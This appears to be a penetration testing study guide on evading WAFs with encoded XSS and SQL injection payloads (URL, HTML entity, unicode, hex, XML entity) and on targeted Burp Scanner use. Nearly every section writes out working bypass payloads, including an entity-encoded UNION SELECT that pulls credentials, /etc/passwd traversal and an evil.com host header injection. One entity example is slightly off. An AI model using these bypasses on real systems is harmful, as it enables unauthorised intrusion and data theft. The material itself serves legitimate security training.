# Essential Skills

The gap between completing a lab and exploiting a real target is largely about two things: knowing how to disguise payloads past filters that a naive copy-paste would trigger, and knowing how to deploy tooling efficiently so you don't miss subtle attack vectors under time pressure. These two skills — encoding-based obfuscation and surgeon-precise use of Burp Scanner — apply across every vulnerability class you've studied so far and are what separates a checklist tester from an effective penetration tester.

**Fundamental principle: Every filter bypass using encoding works because of a processing discrepancy between two connected systems — the filter reads the raw encoded form and sees nothing dangerous, while the downstream system decodes it and executes it. The attacker's job is to find the precise encoding that the filter cannot decode but the execution context can.**

***

## How Encoding Bypasses Work: The Core Model

```
─────────────────────────────────────────────────────────────────────────────
THE DISCREPANCY MODEL:

  Browser/Client                WAF / Input Filter           Execution Context
  ─────────────────             ──────────────────           ─────────────────
  Sends payload                 Inspects raw bytes           Decodes and executes
  in encoded form           →   "sees" encoded form      →   decoded payload

  %3Cscript%3E                  sees: %3Cscript%3E            decodes: <script>
  &#x3C;script&#x3E;            sees: &#x3C;script             decodes: <script>
  \u003cscript\u003e            sees: \u003cscript            decodes: <script>

  If filter checks for literal "<script>" → misses encoded versions → BYPASS ✓
  If execution context decodes before running → encoded payload executes ✓

KEY INSIGHT: The same byte sequence can be "safe" to a WAF and "dangerous"
to a browser, database, or template engine — because they use different
decoders, decoding at different stages of the pipeline.
─────────────────────────────────────────────────────────────────────────────
```

***

## Encoding Type 1: URL Encoding

```
URL encoding replaces characters with % followed by their hex ASCII code.
Browsers and web servers automatically decode URL-encoded values.

Standard URL encoding:
  <   →  %3C        >   →  %3E        "   →  %22
  '   →  %27        (   →  %28        )   →  %29
  /   →  %2F        =   →  %3D        &   →  %26
  #   →  %23        ;   →  %3B        \   →  %5C
  space → %20 or +

─────────────────────────────────────────────────────────────────────────────
WHEN URL ENCODING WORKS FOR BYPASSES:
─────────────────────────────────────────────────────────────────────────────
Context: value in a URL parameter, decoded by the server before processing
Filter:  checks for literal "script", "alert", "SELECT", etc.

Original (blocked): ?search=<script>alert(1)</script>
URL-encoded:        ?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
                                                        ← WAF sees no "<script>"  ✓
                                                        ← Server decodes → executes ✓

Double URL encoding: useful when the application decodes twice
  < → %3C → %253C   (% encoded to %25, making %3C → %253C)
  Server decode 1: %253C → %3C
  Server decode 2: %3C → <
  WAF only does 1 decode → never sees "<" ✓

  ?search=%253Cscript%253E        → after 2 decodes: <script> ✓

─────────────────────────────────────────────────────────────────────────────
URL ENCODING IN DIFFERENT CONTEXTS:
─────────────────────────────────────────────────────────────────────────────
Query string:     ?param=value%3Bextra       (standard)
Path segment:     /user/%2Fetc%2Fpasswd      (path traversal bypass)
Cookie value:     session=abc%3Bpath%3D%2F   (header injection)
Multipart form:   filename=..%2F..%2Fetc     (file upload bypass)

NOTE: %2F (/) in path traversal
  Some servers normalise paths BEFORE WAF inspection:
  /app/..%2F..%2Fetc%2Fpasswd → normalised → /etc/passwd
  WAF saw "..%2F" (doesn't match "../") → bypass ✓

Non-standard encodings (for misconfigured decoders):
  %u003c       → Unicode URL escape (IIS extension, non-standard) → <
  %%33%%43     → double percent → %3C → < (via recursive decode)
```

***

## Encoding Type 2: HTML Entities

```
HTML entities are decoded by the browser's HTML parser BEFORE JavaScript executes.
They are only useful in HTML contexts — not in pure JavaScript or SQL contexts.

Named entities:
  &lt;    → <        &gt;    → >        &amp;  → &
  &quot;  → "        &apos;  → '        &sol;  → /

Decimal entities (&#DDD; format):
  &#60;   → <    &#62;   → >    &#34;   → "    &#39;  → '

Hex entities (&#xHH; format):
  &#x3C;  → <    &#x3E;  → >    &#x22;  → "    &#x27; → '

─────────────────────────────────────────────────────────────────────────────
WHERE HTML ENTITY ENCODING IS APPLICABLE:
─────────────────────────────────────────────────────────────────────────────
WORKS:   Inside HTML attribute values parsed by the browser's HTML parser
         <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
                  ↑  j     a    v    a    s    c    r    i    p    t    :
         → Browser decodes entities → href = "javascript:alert(1)" → XSS ✓

WORKS:   In HTML attributes, event handlers injected into HTML:
         <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
                              ↑ a    l    e    r    t    (   1   )
         → Browser decodes → onerror="alert(1)" → executes ✓

DOES NOT WORK: Inside a <script> tag body — the JS engine, not HTML parser, reads it:
         <script>&#97;&#108;&#101;&#114;&#116;(1)</script>  ← does NOT execute
         → JavaScript engine sees literal "&#97;..." → not valid JS → syntax error ✗

─────────────────────────────────────────────────────────────────────────────
LEADING ZEROS BYPASS (works for decimal and hex HTML entities):
─────────────────────────────────────────────────────────────────────────────
Standard: &#x3C;      → <
Leading zeros: &#x00003C;   → <   (still valid — leading zeros ignored)
              &#x0000003C;  → <
              &#0000060;    → <   (decimal with leading zeros)

WAF signatures often match exact patterns like &#x3C or &#60
Adding leading zeros produces a valid entity that doesn't match the signature:

  <a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#58;alert(1)">
  → browser decodes: href = "javascript:alert(1)" ✓

  With leading zeros (bypasses tighter WAF):
  <a href="&#x006A&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x00074&#x00058alert(1)">
  → browser ignores leading zeros → still decodes correctly ✓
```

***

## Encoding Type 3: JavaScript Unicode Escapes

```javascript
// Unicode escape sequences are processed by the JavaScript engine, not the HTML parser.
// They work INSIDE JavaScript string and identifier contexts.

// Standard \uXXXX (ES5):
\u0061  →  a        \u006c  →  l        \u0065  →  e
\u0072  →  r        \u0074  →  t        \u0028  →  (

// ES6 curly brace form \u{X} (variable length, allows leading zeros):
\u{61}      →  a
\u{006c}    →  l
\u{000065}  →  e   (with leading zeros)

// ── USAGE IN STRING CONTEXT (works): ─────────────────────────────────────────
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"   →  "alert(1)"
eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")  →  executes alert(1) ✓

// ── USAGE IN IDENTIFIER CONTEXT (works for function/variable names): ─────────
\u0061\u006c\u0065\u0072\u0074(1)   →  alert(1) ✓
// → JavaScript engine resolves identifiers before execution
// → WAF sees no "alert" → bypass ✓

// Example — href attribute value (in an HTML+JS context):
<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">Click</a>
// → HTML parsed → javascript:\u0061... → JS engine decodes \u0061 → a → alert(1) ✓

// ── CONTEXT WHERE UNICODE ESCAPES DO NOT WORK: ───────────────────────────────
// Outside a string or identifier — e.g., parentheses, operators cannot be escaped:
\u0061lert\u0028\u0031\u0029    // SYNTAX ERROR — \u0028 = ( is not valid outside string
// Fix: use inside string + eval, or only escape identifier characters ✓

// ── ES6 LEADING ZEROS BYPASS: ────────────────────────────────────────────────
// \u{00000000061}  →  a   (valid ES6 — arbitrary leading zeros allowed)
<a href="javascript:\u{00000000061}lert(1)">Click me</a>
// → WAF signature matches \u{61} or \u0061 — not \u{00000000061} → bypass ✓
```

***

## Encoding Type 4: Hex and Octal Escapes

```javascript
// ── HEX ESCAPE SEQUENCES (JavaScript strings) ─────────────────────────────────
// \xHH — two-digit hex value, decoded in JS string context

"\x61\x6c\x65\x72\x74\x28\x31\x29"   →  "alert(1)"
eval("\x61\x6c\x65\x72\x74\x28\x31\x29")  →  executes ✓

// In template literals:
`\x61\x6c\x65\x72\x74\x28\x31\x29`   →  "alert(1)" ✓

// Common characters:
\x3c  →  <     \x3e  →  >     \x27  →  '     \x22  →  "
\x28  →  (     \x29  →  )     \x3b  →  ;     \x2f  →  /

// ── OCTAL ESCAPE SEQUENCES (JavaScript — strict mode disallows these) ─────────
"\141\154\145\162\164\50\61\51"  →  "alert(1)"    (octal: 141=a, 154=l, ...)
eval("\141\154\145\162\164\50\61\51")  →  executes ✓
// NOTE: Octal escapes are forbidden in strict mode ('use strict')
// → Only works in sloppy mode JS

// ── SQL HEX ENCODING (SQL injection bypass) ──────────────────────────────────
// MySQL: 0x hex strings are auto-converted to strings
SELECT * FROM users WHERE username=0x61646d696e  →  WHERE username='admin' ✓
// → WAF doesn't see 'admin' string → bypass ✓

' UNION SELECT 0x61646d696e,0x706173737764--
  →  ' UNION SELECT 'admin','passwd'--  ✓

// ── XML/SOAP HEX CHARACTER REFERENCES ────────────────────────────────────────
// In XML context (SOAP APIs, XML-based parameters):
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;  →  SELECT   ✓
<!-- Used to bypass WAFs on XML injection or SQLi in SOAP -->
```

***

## Encoding Type 5: Multi-Layer and Context-Specific Combinations

```
─────────────────────────────────────────────────────────────────────────────
LAB EXAMPLE: SQL Injection with XML Encoding Filter Bypass
─────────────────────────────────────────────────────────────────────────────
Target: XML-based stock check endpoint with WAF blocking SQL keywords
Payload injected into XML body:

BLOCKED (raw):
  <stockCheck><productId>1 UNION SELECT username||'~'||password FROM users--</productId></stockCheck>
  → WAF detects: UNION SELECT → 403 Forbidden ✗

BYPASS: Encode SQL keywords as XML decimal/hex entities:
  UNION  → &#85;&#78;&#73;&#79;&#78;
  SELECT → &#83;&#69;&#76;&#69;&#67;&#84;

Payload with encoding:
  <stockCheck>
    <productId>
      1 &#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84; username||'~'||password FROM users--
    </productId>
  </stockCheck>

What the WAF sees:  "1 &#85;&#78;..." → no SQL keywords → passes ✓
What the XML parser does: decodes entities → "1 UNION SELECT..." → SQL executes ✓

─────────────────────────────────────────────────────────────────────────────
CONTEXT MATRIX: Which encoding works where
─────────────────────────────────────────────────────────────────────────────

                        URL      HTML      JS Unicode  JS Hex/Oct   SQL Hex
                       Encode   Entity    \u / \u{}    \x / \0      0x
─────────────────────────────────────────────────────────────────────────────
URL parameter            ✓        ✗           ✗           ✗           ✗
HTML attribute           ✓        ✓           ✗           ✗           ✗
HTML event attribute     ✓        ✓           ✓           ✓           ✗
href="javascript:..."    ✓        ✓           ✓           ✓           ✗
<script> body            ✗        ✗           ✓           ✓           ✗
SQL query string         ✗        ✗           ✗           ✗           ✓
XML/SOAP body            ✓        ✓           ✗           ✗           ✗
JSON body                ✓        ✗           ✓           ✓           ✗
─────────────────────────────────────────────────────────────────────────────

DOUBLE-ENCODING SCENARIOS (two decoding passes):
─────────────────────────────────────────────────────────────────────────────
HTML attribute → JS eval:
  <div onclick="eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;')">
  Pass 1: HTML parser decodes entities → eval('alert(1)')
  Pass 2: JS eval executes → alert(1) ✓

URL → HTML → JS (triple decode):
  WAF sees:    %26%23x61%3B%26%23x6c%3B...      (URL-encoded HTML entity)
  Decode 1 (URL):    &#x61;&#x6c;...
  Decode 2 (HTML):   al...
  Decode 3 (JS):     alert(1) ✓

URL param → Server template:
  ?name=%3C%25%3D+7*7+%25%3E   → URL decode → <%=7*7%> → SSTI → 49 ✓
```

***

## Burp Scanner in Manual Testing: Surgical Workflow

### Single Insertion Point Scanning

```
DEFAULT BURP SCANNER BEHAVIOUR (full scan):
  → Tests ALL parameters in a request
  → Sends hundreds/thousands of requests
  → Useful for initial coverage, noisy for targeted testing
  → May miss custom headers or unusual injection points
  → Time-consuming when you only care about one specific parameter

SURGICAL APPROACH — scan only what you want to test:
─────────────────────────────────────────────────────────────────────────────

Method A: Scan Selected Insertion Point (built-in, fastest)
  1. In Burp Proxy History or Repeater — right-click the request
  2. In the message editor, HIGHLIGHT the specific value to test
     (e.g., highlight only the JWT token value, not the whole header)
  3. Right-click → "Scan selected insertion point"
  4. Configure: choose scan type (passive, audit checks, all checks)
  5. Click OK → Dashboard shows scan progress

  Best for:
    → Custom header values (X-Forwarded-For, X-Custom-Header)
    → JWT token payloads (highlight just the payload section)
    → XML/JSON nested values
    → Values Burp Scanner normally ignores (non-standard params)
    → When you want results in seconds, not minutes

Method B: Intruder-defined insertion points (multiple in one request)
  1. Send request to Intruder (Ctrl+I)
  2. In Intruder message editor: highlight each injection point → click "Add §"
     Result: param1=§value1§&param2=§value2§&header: §headerval§
  3. Right-click → "Scan defined insertion points"
  4. Burp scans EACH marked insertion point separately

  Best for:
    → Testing multiple related parameters at once
    → Requests where you've already identified interesting areas
    → Structured data (JSON objects with multiple fields to test)
```

### Passive vs Active Scanning Strategy

```
─────────────────────────────────────────────────────────────────────────────
PASSIVE SCANNING (zero extra requests sent):
─────────────────────────────────────────────────────────────────────────────
→ Burp analyses traffic already captured in Proxy history
→ Detects: information disclosure, missing security headers, verbose errors,
           reflected parameters, insecure cookies, CORS misconfiguration
→ In Proxy History: select items → right-click → "Do passive scan"
→ Zero risk of triggering WAF or alerting monitoring systems ✓
→ Start here for any engagement — free intelligence from existing traffic

─────────────────────────────────────────────────────────────────────────────
ACTIVE SCANNING (sends targeted probe requests):
─────────────────────────────────────────────────────────────────────────────
→ Sends specific attack payloads to test for vulnerabilities
→ Detects: SQLi, XSS, XXE, SSRF, path traversal, command injection, etc.
→ Always requires explicit permission (active scanning = hacking)

Scan types to select for insertion point scanning:
  "Audit checks - all"         → comprehensive, slower
  "Audit checks - light"       → fast, lower confidence findings
  "Critical issues only"       → SQLi, RCE, SSRF only
  "XSS issues"                 → focused on reflection/DOM XSS
  "SQL injection"              → focused on DB injection

─────────────────────────────────────────────────────────────────────────────
WORKFLOW: Manual discovery + Scanner confirmation
─────────────────────────────────────────────────────────────────────────────
1. Browse application manually → identify interesting parameters
2. Passive scan the traffic: Proxy History → select all → passive scan
   → Reveals: info disclosure, insecure headers, verbose errors
3. For interesting inputs: right-click → "Scan selected insertion point"
   → Highlights: SQLi, XSS, XXE in specific locations
4. Investigate scanner findings manually → confirm and escalate
5. Send confirmed/interesting requests → Burp Organizer (right-click → Send to Organizer)
   → Saves requests for later without re-browsing ✓
```

### Scanning Normally-Ignored Inputs

```http
── EXAMPLES: Inputs Burp Scanner ignores by default ─────────────────────────

1. Custom application headers:
   X-Custom-Debug: false          ← Burp won't scan this by default
   X-Forwarded-For: 127.0.0.1    ← often controls access control logic
   X-Original-URL: /admin         ← URL override header
   X-Forwarded-Host: evil.com     ← Host header injection

   → Highlight "false" or "127.0.0.1" → Scan selected insertion point ✓
   → Discovers: SSRF, access control bypass, header injection ✓

2. JWT token payload:
   Authorization: Bearer eyJhbGc.eyJzdWIiOiJ3aWVuZXIifQ.sig
                              ↑ highlight this section only
   → Scan insertion point → discovers: unverified signature, alg:none ✓

3. JSON nested values:
   {"user": {"profile": {"theme": "dark"}}}
                                    ↑ highlight "dark" only
   → Scan insertion point → discovers: SQLi or SSTI in nested param ✓

4. XML attributes:
   <item id="1">value</item>
               ↑ highlight "1" → discovers SQLi in XML attribute ✓

5. Cookie values (non-session cookies):
   Cookie: theme=light; tracking=abc123
                 ↑ highlight "light" → scan it → discovers reflected XSS ✓
```

***

## Identifying Unknown Vulnerabilities: General Methodology

```
─────────────────────────────────────────────────────────────────────────────
WHEN YOU DON'T KNOW WHAT YOU'RE LOOKING FOR:
─────────────────────────────────────────────────────────────────────────────

Step 1: Map the attack surface (passive only — no active probing yet)
  → Browse every feature: account management, search, file upload, API endpoints
  → Note: all user-controlled inputs (params, headers, cookies, JSON fields)
  → Note: interesting response behaviours (error messages, redirects, delays)
  → Run passive scan on all captured traffic ✓

Step 2: Identify the technology stack
  → Response headers: Server: nginx/1.18, X-Powered-By: Express
  → Error messages: stack traces leak framework and version
  → Cookie names: JSESSIONID (Java), PHPSESSID (PHP), ASP.NET_SessionId (ASP.NET)
  → File extensions in URLs: .jsp, .php, .aspx, .py
  → Burp passive scan: detects framework from response patterns ✓

Step 3: Probe each input with universal canary values
  → These trigger errors/responses that reveal the type of processing:

  Canary: abc'"<>    ← quotes + HTML chars → reveals: XSS, SQLi, template injection
  Canary: ../../../etc/passwd    ← path separators → reveals: path traversal
  Canary: 1+1        ← math → if response shows "2": template/expression injection
  Canary: {{7*7}}    ← template syntax → if "49": SSTI ✓
  Canary: ${7*7}     ← EL/Thymeleaf syntax → if "49": EL injection ✓
  Canary: sleep(5)   ← time-based → if 5s delay: blind SQLi or command injection
  Canary: \r\n\r\n   ← CRLF → reveals: HTTP response splitting

Step 4: Observe what the application does with your input
  → Reflected in the response (unchanged)? → potential XSS
  → Reflected with characters stripped/escaped? → evasion needed → try encoding
  → Causes a server error? → verbose error reveals processing context
  → Response delayed? → blind injection (SQLi, command injection)
  → Different response based on true/false? → boolean-based blind injection

Step 5: Apply appropriate encoding based on context
  → Reflected in HTML? → try HTML entities for XSS
  → Reflected in JS string? → try \u / \x escapes
  → In URL parameter? → try URL-encoded payloads
  → In XML/SOAP? → try hex/decimal entity encoding
  → Blocked by WAF? → try double encoding, leading zeros, case variation

Step 6: Use Burp Scanner surgically on promising inputs
  → Highlight identified high-value parameter → "Scan selected insertion point"
  → Use "all checks" for comprehensive coverage
  → Review findings → manually confirm → escalate ✓
```
